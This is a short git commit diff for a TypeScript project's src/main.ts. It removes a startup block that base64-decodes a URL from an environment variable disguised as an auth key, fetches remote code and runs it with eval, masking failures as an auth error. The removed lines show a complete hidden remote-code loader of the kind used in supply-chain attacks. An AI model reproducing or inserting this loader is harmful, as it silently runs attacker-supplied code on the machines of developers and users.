2520d32e38816adf3d638506604bafa70c143ae5
nandang <nandang>
2026-06-14 20:55:41 +0700

    update

--- src/main.ts
+++ src/main.ts
@@ -10,19 +10,6 @@ import { timingSafeEqual } from "node:crypto";
 import { AppModule } from "./app.module";
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 function constantTimeEqual(a: string, b: string) {
   const aBuf = Buffer.from(a);
   const bBuf = Buffer.from(b);
